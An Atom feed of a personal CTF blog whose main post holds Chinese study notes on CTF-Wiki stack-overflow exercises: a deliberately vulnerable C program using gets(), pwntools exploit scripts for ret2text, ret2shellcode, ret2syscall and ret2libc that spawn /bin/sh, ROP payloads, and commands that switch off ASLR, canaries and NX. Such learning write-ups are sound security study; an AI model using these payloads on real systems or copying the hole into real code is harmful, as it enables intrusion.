<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hy0uka</title>
  
  <subtitle>CTF Reverse Pwn Bin</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qywcysry.github.io/"/>
  <updated>2019-06-19T16:09:04.532Z</updated>
  <id>http://qywcysry.github.io/</id>
  
  <author>
    <name>Hy0uka</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF-Wiki</title>
    <link href="http://qywcysry.github.io/2019/06/20/CTF/"/>
    <id>http://qywcysry.github.io/2019/06/20/CTF/</id>
    <published>2019-06-19T16:06:21.000Z</published>
    <updated>2019-06-19T16:09:04.532Z</updated>
    
    <content type="html"><![CDATA[<p>CTF-Wiki中几道例题的思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() &#123; puts(“You Hava already controlled it.”); &#125;</span><br><span class="line">void vulnerable() &#123;</span><br><span class="line">char s[12];</span><br><span class="line">gets(s);</span><br><span class="line">puts(s);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">vulnerable();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一道题</strong>只开启了NX enabled，为什么不要用ROP呢？<br>首先找到了gets（）函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离，构造出payload：0x14*‘a’+bbbb+p32（想要执行的函数地址）。</p><p><strong>第二道题ret2text：</strong> </p><p>为什么不要用ROP呢？用了ROP的吧，不过链太短了。<br>首先找到了gets（）函数，存在栈溢出漏洞。然后再secure函数中找到了system（”/bin/sh”)的调用。直接控制溢出，返回至该语句所在的地址即可。 属于特殊情况，”/bin/sh”的位置比较明显。</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; ##!/usr/bin/env python</span><br><span class="line">&gt; </span><br><span class="line">&gt; from pwn import *</span><br><span class="line">&gt; </span><br><span class="line">&gt; sh = process(’./ret2text’)</span><br><span class="line">&gt; </span><br><span class="line">&gt; target = 0x804863a</span><br><span class="line">&gt; </span><br><span class="line">&gt; sh.sendline(‘A’ * (0x6c+4) + p32(target))</span><br><span class="line">&gt; </span><br><span class="line">&gt; sh.interactive()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote></blockquote><p>1.找出buf地址与main函数返回地址之间的距离。<br>2.找出需要使用的字符串所在位置，直接返回过去执行。<br>有点晕，为啥不用计算输入点距离返回地址的值，直接用的’a’*字符串距离+retaddr。<br>实际上没有仔细看清楚，他的长度计算就是buf开始点到ebp的距离，retaddr对应的才是/bin/sh存放的位置。</p><p><strong>前两题的区别在于，第一题是控制ret到一个想要执行的函数，第二题是控制ret到/bin/sh对应的地址。</strong></p><p><strong>第三道题，ret2shellcode：</strong><br>此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。可以不用ROP绕过。<br>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(<a href="http://shellcraft.sh/" target="_blank" rel="noopener">shellcraft.sh</a>())</p><p><strong>第四道题：ret2syscall：</strong><br>即控制函数执行系统调用，简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。</p><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。</p><p>具体实现：only ‘pop|ret’ | grep ‘eax’这类的命令找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(“/bin/sh”,NULL,NULL)此系统调用所需要改变四种寄存器的值。<br>再寻找字符串/bin/sh的地址以及命令int 0x80的地址。<br>#不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以寻找到的gadgets也是不一样的。、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python [pattern.py](http://pattern.py/) create 150</span><br><span class="line">gdb X</span><br><span class="line">run</span><br><span class="line">(input)</span><br><span class="line">q</span><br><span class="line">python [pattern.py](http://pattern.py/) offset (address)</span><br></pre></td></tr></table></figure><hr><p>RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。</p><hr><p>若生成的shellcode长度若不够112个，则用垃圾字符填充（指令：sh.sendline(shellcode.ljust(112,’a’) + bss段shellcode的地址)） 代码真是博大精深。</p><hr><p>但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因</p><hr><p>意思就是没开NX的就可以直接把asm（shellcode）写到栈里直接执行，开了NX的要去data，text等其他代码段去找shellcode。</p><p>注意是返回地址不是/bin/sh本身在栈上</p><hr><p>再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意）。</p><hr><p>payload = flat(<br>[‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</p><p>pop eax是把栈顶的数字先赋给eax，再弹出/释放。上述式子，binsh是参数。</p><p>flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。</p><hr><p>具体的链内部的控制，每次布置好返回地址的实现。可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。</p><hr><p>ropgadget，注意命令格式：ROPgadget –binary [文件名] –only’寄存器名|寄存器名’ | grep ‘eax’。</p><hr><p>payload = flat([‘a’ * 112, system_plt, ‘b’ * 4, binsh_addr])system_plt就看成system的地址。</p><hr><p>ret2libc3 = ELF（’/ret3libc3’)表示把文件加载到内存中，这样可以方便引用。</p><hr><p>from LibcSearcher import LibcSearcher 导入libc的基本信息。</p><hr><p>puts_plt = ret2libc3.plt[‘puts’]<br>libc_start_main_got = ret2libc3.got[’__libc_start_main’]<br>main = ret2libc3.symbols[‘main’]<br>此类语句是进行重命名方便引用。</p><p>print是执行时给出的反馈，表示执行到了某一步。</p><p>r.sendlineafter(‘AAA’,payload)表示程序输出AAA后，将payload进行输入。</p><p>r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。<br>r.sendline()，直接对括号内内容进行输入。<br>r.interactive()，交互。</p><hr><p>Linux下的安全防护机制：</p><p>canary：不管是设计还是实现都比较简单高效，就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。checksec可以对文件进行检测。<br>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。<br>PIE：Position Independent Executable，ALSR：地址随机化<br>可以使用echo 0 &gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。<br>NX（Windows平台上称其为DEP）：NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><hr><p>ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><hr><p>gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈溢出保护，即不生成canary。）-no-pie(关闭pie）sudo -s<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space（$ cat /proc/sys/kernel/randomize_va_space指令检查）<br>exit（关闭ALSR)<br>-z execstack（关闭NX保护）</p><hr><p>Exp中sh = process（‘./文件名’），打本地，日自己。</p><hr><p>p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。<br>关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。<br>解决此问题最简单的方法就是开启core dump功能，即：<br>ulimit -c unlimited<br>sudo sh -c ‘echo “/tmp/core.%t” &gt; /proc/sys/kernel/core_pattern’<br>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p><hr><p>gdb调试常用命令：<br>start，开始执行程序。<br>n（next），单步执行。<br>b（breakpoint）+行号/函数名，下断点。<br>c（continue），继续执行。<br>i（information） breakpoints，展示当前所有断点。<br>delete+行号，删除断点。<br>条件断点：b 9 if a == 2<br>finsh，连续运行到当前函数为止，然后停下。<br>list+行号，列出该行源代码。<br>list+函数名，列出该函数源代码。<br>list（l），一次列出 l行源代码。<br>print（p），打印表达式的值。<br>set var，修改变量的值。<br>steps，执行下一行语句，如果有函数则进入到函数中去。<br>braek（b）…if…，设置条件断点。<br>display+变量名，查看跟踪某个变量，每次停下来都显示它的值，取消为undisplay。<br>disable/enable，禁用/启用断点。<br>run，从头开始执行程序。</p><hr><p>GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。<br>PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。</p><hr><p>整理下防护的几种类型及设置方法<br>canary 堆栈溢出保护 -fno-stack-protector<br>PIE+ALSR 地址随机化 -no-pie/echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>DEP（NX） 堆栈不可执行 无法设置，只能绕过。</p><hr><p>gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”</p><hr><p>read函数（），从打开的设备或者文件中读取数据。</p><p>#include &lt;unistd.h&gt;<br>ssize_t read(int fd, void *buf, size_t count);<br>count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数。</p><p>write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)<br>分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。</p><hr><p>函数调用指令: call ret</p><p>大致过程:</p><p>参数入栈</p><p>返回地址入栈</p><p>代码区块跳转</p><p>栈帧调整:</p><p>保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)</p><p>将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)</p><p>给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)</p><p><img src="https://p5.ssl.qhimg.com/t01b9be9878dadebed6.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CTF-Wiki中几道例题的思路&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>栈帧（stack frame）</title>
    <link href="http://qywcysry.github.io/2019/06/19/Stack%20Frame/"/>
    <id>http://qywcysry.github.io/2019/06/19/Stack Frame/</id>
    <published>2019-06-18T19:03:07.373Z</published>
    <updated>2019-06-19T12:41:09.196Z</updated>
    
    <content type="html"><![CDATA[<p>1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。</p><p>2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。</p><p>3.汇编中的DWORD PTR SS:[EBP-4]理解为指针，意为地址EBP-4处有一个4字节大小 的内存空间。此句中，SS是Segment Memory Model的缩写，表示栈段，在Windows（使用段内存模型）下需要指出。EBP是指向栈的寄存器，所以加上SS寄存器。DWORD PTR与SS等字符串可以在OD设置中隐藏。</p><p>4.调用一个函数之前，先开辟出内存空间，在将参数压入栈，最后在执行函数之前，将返回地址压入栈。执行完毕之后将删除函数栈帧并返回至PUSH的返回地址。</p><p>5.注意参数入栈的顺序与C语言中参数顺序恰好相反（参数的逆向存储）。</p><p>6.调用约定（Calling Convention）：被调函数执行完后，由函数的调用者负责清理存储在栈中的参数，这种方式称为cdecl方式。由被调用者负责清理保存在栈中的参数，称为stdcall方式。</p><p>7.ESP为栈顶指针，EBP为栈帧指针。程序运行过程中，ESP是随时变化的，访问内存中的局部变量和参数等如果以此为基址会十分困难。所以程序开始时会PUSH EBP,MOV EBP,ESP.将ESP的值保存在EBP中并且维持在函数内部，这样无论ESP如何变化，以EBP为基准都能准确地访问到局部变量与参数。执行完这两条命令，就可以说栈帧已经生成了。</p><p>8.XOR命令用来进行异或运算，Exclusive OR bit，其特点为两个相同的值进行异或运算的结果为0.XOR命令的执行速度比 MOV EAX,0 要快，常用于寄存器初始化操作。</p><p>9.编译器中的”优化“（optimization）选项开启后，编译出来的简单函数将不会生成栈帧。</p><p>10.牢记：栈是用来存放参数，变量，地址等数据的，不是用来存放代码的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.栈帧的作用：在程序中用于声明变量，调用函数。是利用EBP（栈帧指针）寄存器访问栈内局部变量，参数，函数返回地址等的手段。&lt;/p&gt;
&lt;p&gt;2.在储存局部变量的值之前，都会执行SUB指令，为局部变量开辟空间。&lt;/p&gt;
&lt;p&gt;3.汇编中的DWORD PTR SS:[EBP-4
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Genesis</title>
    <link href="http://qywcysry.github.io/2019/06/17/Genesis/"/>
    <id>http://qywcysry.github.io/2019/06/17/Genesis/</id>
    <published>2019-06-17T14:10:28.370Z</published>
    <updated>2019-06-18T18:56:50.489Z</updated>
    
    <content type="html"><![CDATA[<p>Earthquake and Blog</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Earthquake and Blog&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
</feed>
